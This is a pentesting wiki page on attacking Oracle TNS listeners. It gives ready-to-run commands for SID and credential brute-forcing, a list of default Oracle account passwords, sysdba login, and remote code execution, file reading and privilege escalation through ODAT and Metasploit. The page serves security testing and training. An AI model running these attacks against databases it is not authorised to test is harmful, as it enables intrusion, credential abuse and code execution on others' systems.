<h1 id="1521-1522-1529-Pentesting-Oracle-TNS-Listener"><a href="#1521-1522-1529-Pentesting-Oracle-TNS-Listener" class="headerlink" title="1521,1522-1529 - Pentesting Oracle TNS Listener"></a>1521,1522-1529 - Pentesting Oracle TNS Listener</h1><h2 id="Basic-Information"><a href="#Basic-Information" class="headerlink" title="Basic Information"></a>Basic Information</h2><p>Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation (from <a href="https://www.techopedia.com/definition/8711/oracle-database" target="_blank" rel="noopener">here</a>).</p>
<p>When enumerating Oracle the first step is to talk to the TNS-Listener that usually resides on the default port (1521/TCP, -you may also get secondary listeners on 1522–1529-).</p>
<pre><code class="text">1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener
</code></pre>
<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><ol>
<li><strong>Enumerate version</strong> info (search for <strong>known vulns</strong>)</li>
<li><strong>Bruteforce TNS listener</strong> communication (not always needed)</li>
<li><strong>Enumerate</strong>/Bruteforce <strong>SID names</strong> (like database names)</li>
<li><strong>Bruteforce credentials</strong> for valid SID name discovered</li>
<li>Try to <strong>execute code</strong> </li>
</ol>
<p>In order to user MSF oracle modules you need to install some dependencies: ****<a href="oracle-pentesting-requirements-installation.md"><strong>Installation</strong></a>****</p>
<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><p>Tools that can be used for this are: nmap, MSF and <a href="http://dokfleed.net/files/audit/tnscmd10g.zip" target="_blank" rel="noopener">tnscmd10g</a>.</p>
<h3 id="TNS-listener-version"><a href="#TNS-listener-version" class="headerlink" title="TNS listener version"></a>TNS listener version</h3><pre><code class="bash">nmap --script &quot;oracle-tns-version&quot; -p 1521 -T4 -sV &lt;IP&gt;
msf&gt; use auxiliary/scanner/oracle/tnslsnr_version
#apt install tnscmd10g
tnscmd10g version -p 1521 -h &lt;IP&gt;
</code></pre>
<p>Other useful TNS listener commands:</p>
<table>
<thead>
<tr>
<th align="left"><strong>Command</strong></th>
<th align="left"><strong>Purpose</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="left">ping</td>
<td align="left">Ping the listener</td>
</tr>
<tr>
<td align="left">version</td>
<td align="left">Provide output of the listener version and platform information</td>
</tr>
<tr>
<td align="left">status</td>
<td align="left">Return the current status and variables used by the listener</td>
</tr>
<tr>
<td align="left">services</td>
<td align="left">Dump service data</td>
</tr>
<tr>
<td align="left">debug</td>
<td align="left">Dump debugging information to the listener log</td>
</tr>
<tr>
<td align="left">reload</td>
<td align="left">Reload the listener configuration file</td>
</tr>
<tr>
<td align="left">save_config</td>
<td align="left">Write the listener configuration file to a backup location</td>
</tr>
<tr>
<td align="left">stop</td>
<td align="left">Invoke listener shutdown</td>
</tr>
</tbody></table>
<p>If you <strong>receive an error</strong>, could be because <strong>TNS versions are incompatible</strong> (Use the <code>--10G</code> parameter with <code>tnscmd10</code>) and if the <strong>error persist,</strong> the listener may be <strong>password protected</strong> (you can see a list were all the <a href="https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7" target="_blank" rel="noopener"><strong>errors are detailed here</strong></a>) — don’t worry… hydra to the rescue**:**</p>
<pre><code class="text">hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
</code></pre>
<p>The TNS listener could be vulnerable to <strong>MitM</strong> attacks. <a href="tns-poison.md">Check here how to check if the server is vulnerable and how to perform the attack (all versions up to version 12c are)</a>.</p>
<h3 id="SID-enumeration"><a href="#SID-enumeration" class="headerlink" title="SID enumeration"></a>SID enumeration</h3><h4 id="What-is-a-SID"><a href="#What-is-a-SID" class="headerlink" title="What is a SID"></a><strong>What is a SID</strong></h4><p>The SID (Service Identifier) is essentially the database name, depending on the install you may have one or more default SIDs, or even a totally custom dba defined SID.</p>
<p><strong>In some old versions (in 9 it works)</strong> you could ask for the SID and the database send it to you:</p>
<pre><code class="bash">tnscmd10g status-p 1521 -h &lt;IP&gt; #The SID are inside: SERVICE=(SERVICE_NAME=&lt;SID_NAME&gt;)

#msf1
msf&gt; use auxiliary/scanner/oracle/sid_enum
msf&gt; set rhost &lt;IP&gt;
msf&gt; run
#msf2
msf&gt; use auxiliary/admin/oracle/tnscmd
msf&gt; set CMD (CONNECT_DATA=(COMMAND=STATUS))
msf&gt; set rhost &lt;IP&gt;
msf&gt; run #The SID are inside: SERVICE=(SERVICE_NAME=&lt;SID_NAME&gt;)
</code></pre>
<p>If you cant access this way to the SIDs you will need to bruteforce them:</p>
<p><strong>SID Bruteforce</strong></p>
<p>I have merged the nmap and MSF sid lists into this one (without duplicates):</p>
<p><img src="../../.gitbook/assets/sids-oracle.txt"></p>
<pre><code class="bash">hydra -L /usr/share/metasploit-framework/data/wordlists/sid.txt -s 1521 &lt;IP&gt; oracle-sid
patator oracle_login host=&lt;IP&gt; sid=FILE0 0=sids-oracle.txt -x ignore:code=ORA-12505
./odat.py sidguesser -s $SERVER -d $SID --sids-file=./sids.txt
msf&gt; use auxiliary/admin/oracle/sid_brute #This will use the list located at /usr/share/metasploit-framework/data/wordlists/sid.txt
nmap --script +oracle-sid-brute -p 1521 10.11.1.202 #This will use the list lcated at /usr/share/nmap/nselib/data/oracle-sids
</code></pre>
<p>In order to use <strong>oracle_login</strong> with <strong>patator</strong> you need to <strong>install</strong>:</p>
<pre><code class="text">pip3 install cx_Oracle --upgrade
</code></pre>
<h2 id="Targeting-Accounts"><a href="#Targeting-Accounts" class="headerlink" title="Targeting Accounts"></a><strong>Targeting Accounts</strong></h2><p><strong>Got SID?</strong> Excellent, now let’s move to the next task and extract the user account information. From this point, you can connect to the listener and brute-force credentials.</p>
<p><strong>Metasploit</strong> _****scanner/oracle/oracle_login_ It has a built-in dictionary for the <strong>most popular default values of user account</strong> information presented as login:password. By the way, such default entries represent one of the most popular and serious security problems in Oracle.</p>
<p><strong>Nmap</strong> can also help here with the script <em>oracle-brute</em>. Note that this script <strong>mixes the logins and passwords</strong>, that is, it tries each login against every password, and it takes quite a while!</p>
<h3 id="Default-Passwords"><a href="#Default-Passwords" class="headerlink" title="Default Passwords"></a><strong>Default Passwords</strong></h3><p>Below are some of the default passwords associated with Oracle:</p>
<ul>
<li><strong>DBSNMP/DBSNMP</strong> — Intelligent Agent uses this to talk to the db server (its some work to change it)</li>
<li><strong>SYS/CHANGE_ON_INSTALL</strong> — Default sysdba account before and including Oracle v9, as of version 10g this has to be different!</li>
<li><strong>PCMS_SYS/PCMS_SYS</strong> — Default x account</li>
<li><strong>WMSYS/WMSYS</strong> — Default x account</li>
<li><strong>OUTLN/OUTLN</strong> — Default x account</li>
<li><strong>SCOTT/TIGER</strong> — Default x account</li>
</ul>
<p>Other <strong>default passwords</strong> can be found <a href="http://www.petefinnigan.com/default/oracle_default_passwords.htm" target="_blank" rel="noopener">here </a>and <a href="https://cirt.net/passwords?vendor=Oracle" target="_blank" rel="noopener">here</a>.</p>
<p>The versions 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2, and 11.2.0.3 are vulnerable to <strong>offline brute force</strong>. ****<a href="remote-stealth-pass-brute-force.md"><strong>Read more about this technique here.</strong></a>****</p>
<h3 id="User-Pass-bruteforce"><a href="#User-Pass-bruteforce" class="headerlink" title="User/Pass bruteforce"></a>User/Pass bruteforce</h3><p>Different tools offered <strong>different user/pass lists</strong> for oracle:</p>
<ul>
<li><strong>oscan:</strong> <em>/usr/share/oscanner/accounts.default</em> (169 lines)</li>
<li><strong>MSF-1:</strong>  <em>from</em> admin/oracle/oracle_login  __/usr/share/metasploit-framework/data/wordlists/oracle_default_passwords.csv (598 lines)</li>
<li><strong>MSF-2:</strong> <em>from scanner/oracle/oracle_login</em>  <em>/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt</em> (568 lines)</li>
<li><strong>Nmap:</strong> <em>/usr/share/nmap/nselib/data/oracle-default-accounts.lst</em> (687 lines)</li>
</ul>
<p>I have <strong>mixed</strong> all of them and <strong>removed duplicates:</strong></p>
<p><img src="../../.gitbook/assets/sids-users-oracle.txt"><br><img src="../../.gitbook/assets/pass-oracle.txt"></p>
<h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a><a href="../../brute-force.md#oraclesql">Brute Force</a></h3><p>Now, that you <strong>know a valid SID and valid credentials</strong>. To connect to the database you need the tool: <em><strong>sqlplus</strong></em> and to install it you need to follow some steps: </p>
<p><a href="oracle-pentesting-requirements-installation.md">Installation</a></p>
<p>To login using known credentials:</p>
<pre><code class="text">sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;/&lt;SID&gt;;
</code></pre>
<p>If the TNS Listener is on a non-default port (e.g. TCP/1522) :</p>
<pre><code class="text">sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;:&lt;port&gt;/&lt;SID&gt;;
</code></pre>
<p>If an <strong>account has system database priviledges (sysdba) or system operator (sysop)</strong> you may wish to try the following:</p>
<pre><code class="bash">sqlplus &lt;username&gt;/&lt;password&gt;@&lt;ip_address&gt;/&lt;SID&gt; &#39;as sysdba&#39;;
#Example:
sqplus SYSTEM/MANAGER@192.168.0.2/ORCL &#39;as sysdba&#39;
</code></pre>
<h2 id="All-in-One"><a href="#All-in-One" class="headerlink" title="All in One"></a><strong>All in One</strong></h2><p><strong>An interesting tool is oscanner</strong>, which will try to get some valid SID and then it will brute-force for valid credentials and try to extract some information:</p>
<pre><code class="bash">#apt install oscanner
oscanner -s &lt;IP&gt; -P &lt;PORT&gt;
</code></pre>
<p>Another tool that will do all of this it <a href="https://github.com/quentinhardy/odat" target="_blank" rel="noopener"><strong>odat</strong></a>:</p>
<pre><code class="bash">git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py --help #It shouldn&#39;t be problems in Kali
./odat.py all -s &lt;IP&gt; -p &lt;PORT&gt;
./odat.py all -s &lt;IP&gt; -p &lt;PORT&gt; -d &lt;SID&gt; #To bruteforce accounts for that SID
</code></pre>
<p>With these options (<em>-s</em> and _-p_), ODAT will <strong>search valid SID</strong> (System ID) in a first step. You can configure some options for configuring methods (i.e. word-list or brute-force attack). By default, ODAT will use a big word list and it will do a small brute-force attack.</p>
<p>If ODAT <strong>founds at least one SID</strong> (e.g. _ORCL_), it will <strong>search valid Oracle accounts</strong>. It will do that on <strong>each SID found</strong>. You can specify some options for credentials (e.g. <em>–accounts-file</em>, <em>–accounts-files</em>, _–login-as-pwd_).</p>
<p>For <strong>each valid account</strong> (e.g. _SYS_) <strong>on each valid instance</strong> (SID), ODAT will return <strong>what each Oracle user can do</strong> (e.g. reverse shell, read files, become DBA).</p>
<p><a href="https://github.com/quentinhardy/odat/wiki" target="_blank" rel="noopener"><strong>Wiki odat</strong></a>****</p>
<h2 id="Remote-Code-Execution"><a href="#Remote-Code-Execution" class="headerlink" title="Remote Code Execution"></a>Remote Code Execution</h2><p>There are at least two different ways to execute commands, such as by using Java procedures and DBMS_SCHEDULER package. By the way, you can also achieve RCE in case of SQL injection in a web application provided, of course, that the user running it has sufficient rights. At this stage, I highly recommend preparing the Oracle Database Attacking Tool: <a href="https://github.com/quentinhardy/odat" target="_blank" rel="noopener">ODAT</a>.</p>
<h3 id="Install-ODAT"><a href="#Install-ODAT" class="headerlink" title="Install ODAT"></a>Install ODAT</h3><pre><code class="bash">git clone https://github.com/quentinhardy/odat.git
cd odat
./odat.py #It shouldn&#39;t be problems in Kali
</code></pre>
<h3 id="Execute-Code-via-Java-Stored-Procedure"><a href="#Execute-Code-via-Java-Stored-Procedure" class="headerlink" title="Execute Code via Java Stored Procedure"></a>Execute Code via Java Stored Procedure</h3><pre><code class="bash">./odat.py java -s &lt;IP&gt; -U &lt;username&gt; -P &lt;password&gt; -d &lt;SID&gt; --exec COMMAND
</code></pre>
<p><a href="oracle-rce-and-more.md#rce-java-store-procedure">More details here</a></p>
<h3 id="Execute-code-via-Scheduler"><a href="#Execute-code-via-Scheduler" class="headerlink" title="Execute code via Scheduler"></a>Execute code via Scheduler</h3><pre><code class="bash">./odat.py dbmsscheduler -s &lt;IP&gt; -d &lt;SID&gt; -U &lt;username&gt; -P &lt;password&gt; --exec &quot;C:\windows\system32\cmd.exe /c echo 123&amp;gt;&amp;gt;C:\hacK&quot;
</code></pre>
<p><a href="oracle-rce-and-more.md#rce-scheduler">More details here</a></p>
<h3 id="Execute-code-via-External-Tables"><a href="#Execute-code-via-External-Tables" class="headerlink" title="Execute code via External Tables"></a>Execute code via External Tables</h3><pre><code class="bash">./odat.py externaltable -s &lt;IP&gt; -U &lt;username&gt; -P &lt;password&gt; -d &lt;SID&gt; --exec &quot;C:/windows/system32&quot; &quot;calc.exe&quot;
</code></pre>
<p>‘ODAT.py’ requires the privilege ‘CREATE ANY DIRECTORY’, which, by default, is granted only to DBA role, since it attempts to execute the file from any and not only “your” directory (the manual version of this attack requires less privileges).</p>
<p><a href="oracle-rce-and-more.md#rce-external-tables">More details here.</a></p>
<h2 id="Read-Write-files"><a href="#Read-Write-files" class="headerlink" title="Read/Write files"></a>Read/Write files</h2><pre><code class="bash">./odat.py utlfile -s &lt;IP&gt; -d &lt;SID&gt; -U &lt;username&gt; -P &lt;password&gt; --getFile &quot;C:/test&quot; token.txt token.txt
./odat.py externaltable -s &lt;IP&gt; -U &lt;username&gt; -P &lt;password&gt; -d &lt;SID&gt; --getFile &quot;C:/test&quot; &quot;my4.txt&quot; &quot;my&quot;
</code></pre>
<p><a href="oracle-rce-and-more.md#read-write-files">More details here</a></p>
<h2 id="Elevating-Privileges"><a href="#Elevating-Privileges" class="headerlink" title="Elevating Privileges"></a>Elevating Privileges</h2><p><a href="oracle-rce-and-more.md#elevating-privileges">More details here</a></p>
<p>You can use the <a href="https://github.com/quentinhardy/odat/wiki/privesc" target="_blank" rel="noopener">privesc </a>module from odat to escalate privileges. In that link you can find <strong>several ways to escalate privileges using odat.</strong></p>
<pre><code class="bash">./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
</code></pre>
<p>Vulnerability tested on oracle 10.1.0.3.0 – should work on thru 10.1.0.5.0 and supposedly on 11g. Fixed with Oracle Critical Patch update October 2007.</p>
<pre><code class="bash">msf&gt; use auxiliary/sqli/oracle/lt_findricset_cursor
</code></pre>
<h2 id="Free-Virtual-Environment-for-testing"><a href="#Free-Virtual-Environment-for-testing" class="headerlink" title="Free Virtual Environment for testing"></a>Free Virtual Environment for testing</h2><p>If you want to practice attacking Oracle databases, the safest way is to register for the Oracle Developer Days Virtualbox VM:</p>
<p><a href="http://www.oracle.com/technetwork/database/enterprise-edition/databaseappdev-vm-161299.html" target="_blank" rel="noopener">http://www.oracle.com/technetwork/database/enterprise-edition/databaseappdev-vm-161299.html</a></p>
<p>Most part of the information in this post was extracted from: <a href="https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573" target="_blank" rel="noopener">https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573</a> and from <a href="https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/" target="_blank" rel="noopener">https://hackmag.com/uncategorized/looking-into-methods-to-penetrate-oracle-db/</a></p>
<p>Other interesting <strong>references</strong>:</p>
<p><a href="http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html" target="_blank" rel="noopener">http://blog.opensecurityresearch.com/2012/03/top-10-oracle-steps-to-secure-oracle.html</a></p>
